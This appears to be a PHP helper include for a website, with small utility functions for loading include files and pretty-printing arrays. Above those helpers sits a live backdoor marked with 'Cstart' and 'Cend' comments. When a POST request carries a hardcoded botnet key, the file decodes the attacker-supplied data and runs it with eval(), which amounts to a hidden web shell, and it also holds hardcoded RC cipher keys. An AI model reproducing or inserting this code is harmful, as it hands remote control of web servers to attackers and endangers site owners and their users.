<?php

//Cstart

//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-IGd9T6ZgJLTQgkAO'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') != false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') != false) exit;
//rc start
$rc['key'] = '1111111111111111';
$rc['iv'] = '12345678';
//rc end
//Cend

function get_function($name){
    global $dir;
    
    if(is_array($dir)){
	if(file_exists($dir['site'] . 'includes/functions.'.$name.'.php')) include_once($dir['site'] . 'includes/functions.'.$name.'.php');
    }elseif(!empty($dir)){
	if(file_exists($dir . 'includes/functions.'.$name.'.php')) include_once($dir. 'includes/functions.'.$name.'.php');
    }else{
	if(file_exists('includes/functions.'.$name.'.php')) include_once('includes/functions.'.$name.'.php');
    }
}

function print_rm($str){
    echo '<pre>';
    print_r($str);
    echo '</pre>';
}

function pm($str){
   print_rm($str);
}

?>